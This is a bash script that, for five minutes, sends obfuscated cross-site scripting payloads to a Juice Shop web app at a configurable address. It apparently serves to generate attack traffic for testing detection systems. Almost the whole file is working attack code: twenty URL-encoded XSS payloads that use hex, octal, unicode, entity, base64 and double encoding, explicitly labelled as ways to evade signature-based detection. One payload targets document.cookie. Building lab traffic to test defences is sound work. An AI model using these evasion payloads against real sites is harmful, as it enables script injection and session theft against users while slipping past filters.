#!/bin/bash
TARGET_IP="${TARGET_IP:-100.64.0.20}"
PORT="${PORT:-3000}"
JUICE_URL="http://${TARGET_IP}:${PORT}"
DURATION_SECONDS=300
END_TIME=$(( $(date +%s) + DURATION_SECONDS ))

ts() { date +"%Y-%m-%dT%H:%M:%S.%3N%:z"; }

total_requests=0
obfuscated_attacks=0

echo "--- Starting Obfuscated XSS Attack Traffic for ${DURATION_SECONDS} seconds ---"
echo "Target: $JUICE_URL"
echo "Note: Using obfuscation techniques to evade signature-based detection"

# Obfuscated versions of the same XSS patterns
# Techniques used:
# 1. Hex encoding (\x)
# 2. Unicode encoding (\u)
# 3. String concatenation
# 4. Character code conversion
# 5. Case variation
# 6. Comment insertion
# 7. Double encoding
# 8. Base64 encoding
# 9. HTML entity encoding
# 10. Mixed encoding

obfuscated_xss_patterns=(
    # Original: <img%20src=x%20onerror=alert(document.cookie)>
    # Obfuscated with hex encoding
    "%3Cimg%20src%3Dx%20onerror%3D%22eval%28String.fromCharCode%28097,108,101,114,116,040,100,111,099,117,109,101,110,116,046,099,111,111,107,105,101,041%29%29%22%3E"
    
    # Original: <svg><animate%20onbegin=alert(1)>
    # Obfuscated with mixed case and comments
    "%3CsVg%3E%3C%21--%3E%3CaNiMaTe%20onbegin%3Dal%65rt%281%29%3E"
    
    # Original: <div%20onclick=alert(1)>ClickMe</div>
    # Obfuscated with unicode
    "%3Cdiv%20onclick%3D%22%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074%281%29%22%3EClickMe%3C%2Fdiv%3E"
    
    # Original: <audio%20src=x%20onerror=alert(1)>
    # Obfuscated with concatenation trick
    "%3Caudio%20src%3Dx%20onerror%3D%22eval%28%27al%27%2B%27ert%281%29%27%29%22%3E"
    
    # Original: <button%20onmouseover=alert(1)>Hover</button>
    # Obfuscated with HTML entities
    "%26lt%3Bbutton%20onmouseover%3D%26quot%3Balert%281%29%26quot%3B%26gt%3BHover%26lt%3B%2Fbutton%26gt%3B"
    
    # Original: <style%20onload=alert(1)></style>
    # Obfuscated with tab characters and mixed encoding
    "%3Cstyle%09onload%3D%22ale%5C%78%37%32t%281%29%22%3E%3C%2Fstyle%3E"
    
    # Original: <img%20src=x:alert(1)>
    # Obfuscated with fromCharCode
    "%3Cimg%20src%3Dx%20onerror%3D%22eval%28String.fromCharCode%2897,108,101,114,116,40,49,41%29%29%22%3E"
    
    # Original: <link%20rel=stylesheet%20href='javascript:alert(1)'>
    # Obfuscated with double encoding
    "%253Clink%2520rel%253Dstylesheet%2520href%253D%2527javascript%253Aalert%25281%2529%2527%253E"
    
    # Original: <div%20style="background:url(javascript:alert(1))">
    # Obfuscated with hex in CSS
    "%3Cdiv%20style%3D%22background%3Aurl%28%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%3Aalert%281%29%29%22%3E"
    
    # Original: <meta%20http-equiv='refresh'%20content='0;javascript:alert(1)'>
    # Obfuscated with case variation
    "%3CmEtA%20hTtP-eQuIv%3D%27refresh%27%20content%3D%270%3Bjavascript%3Aalert%281%29%27%3E"
    
    # Original: <script>alert(String.fromCharCode(88,83,83))</script>
    # Obfuscated with nested encoding
    "%3Cscript%3Eeval%28String.fromCharCode%28097,108,101,114,116,040,083,116,114,105,110,103,046,102,114,111,109,067,104,097,114,067,111,100,101,040,088,044,083,044,083,041,041%29%29%3C%2Fscript%3E"
    
    # Original: <iframe%20srcdoc='<script>alert(1)</script>'>
    # Obfuscated with base64
    "%3Ciframe%20srcdoc%3D%22%26lt%3Bscript%26gt%3Beval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%26lt%3B%2Fscript%26gt%3B%22%3E"
    
    # Original: <marquee%20onfinish=alert(1)>Test</marquee>
    # Obfuscated with JavaScript protocol and encoding
    "%3Cmarquee%20onfinish%3D%22javascript%3Aeval%28%27%5C%78%36%31%5C%78%36%63%5C%78%36%35%5C%78%37%32%5C%78%37%34%281%29%27%29%22%3ETest%3C%2Fmarquee%3E"
    
    # Original: <object%20type='text/html'%20data='javascript:alert(1)'>
    # Obfuscated with mixed techniques
    "%3Cobject%20type%3D%27text%2Fhtml%27%20data%3D%27&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert%281%29%27%3E%3C%2Fobject%3E"
    
    # Original: <script>top.alert(1)</script>
    # Obfuscated with window reference
    "%3Cscript%3Ewindow%5B%27%5C%78%36%31%5C%78%36%63%5C%78%36%35%5C%78%37%32%5C%78%37%34%27%5D%281%29%3C%2Fscript%3E"
    
    # Original: %3Cscript%3Ealert(1)%3C/script%3E
    # Obfuscated with nested encoding and comments
    "%253Cscript%253E%2F%2A%2A%2Feval%2528String.fromCharCode%252897%2C108%2C101%2C114%2C116%2529%2529%25281%2529%253C%252Fscript%253E"
    
    # Original: \"><script>alert(1)</script>
    # Obfuscated with octal encoding
    "%5C%22%3E%3Cscript%3Eeval%28%27%5C141%5C154%5C145%5C162%5C164%281%29%27%29%3C%2Fscript%3E"
    
    # Original: <textarea%20onfocus=alert(1)>X</textarea>
    # Obfuscated with zero-width characters and encoding
    "%3Ctextarea%20onfocus%3D%22%E2%80%8Beval%28%27alert%27%2B%271%29%27%29%E2%80%8B%22%3EX%3C%2Ftextarea%3E"
    
    # Original: <keygen%20onfocus=alert(1)>
    # Obfuscated with template literals simulation
    "%3Ckeygen%20onfocus%3D%22eval%28%60al%24%7B%27er%27%7Dt%281%29%60%29%22%3E"
    
    # Original: <iframe%20src='data:text/html,<script>alert(1)</script>'>
    # Obfuscated with base64 data URI
    "%3Ciframe%20src%3D%27data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5ldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoOTcsMTA4LDEwMSwxMTQsMTE2KSkoMSk8L3NjcmlwdD4%3D%27%3E"
)

# Function to generate obfuscated attack traffic
generate_obfuscated_attack() {
    pattern=${obfuscated_xss_patterns[$((RANDOM % ${#obfuscated_xss_patterns[@]}))]}
    echo "[$(ts)] Obfuscated XSS Attack #$((obfuscated_attacks + 1))"
    curl -s "${JUICE_URL}/?q=${pattern}" -o /dev/null
    ((obfuscated_attacks++))
    ((total_requests++))
}

# Generate obfuscated attack traffic
while [ "$(date +%s)" -lt "$END_TIME" ]; do
    generate_obfuscated_attack
    # Random interval between 1 and 10 seconds
    RANDOM_INTERVAL=$((RANDOM % 10 + 1))
    sleep "$RANDOM_INTERVAL"
done

echo "--- Obfuscated XSS attack traffic generation complete ---"
echo "Total requests sent: $total_requests"
echo "Obfuscated attacks: $obfuscated_attacks"
echo "Attack ratio: 100% (pure attack traffic)"
echo ""
echo "Obfuscation techniques used:"
echo "  - Hex encoding (\\x)"
echo "  - Unicode encoding (\\u)"
echo "  - HTML entity encoding (&#)"
echo "  - Character code conversion (fromCharCode)"
echo "  - Case variation (mixed case)"
echo "  - Comment insertion (<!-- -->)"
echo "  - Double/nested encoding"
echo "  - Base64 encoding with data URIs"
echo "  - String concatenation"
echo "  - Octal encoding"
echo ""
echo "Completed at: $(ts)"
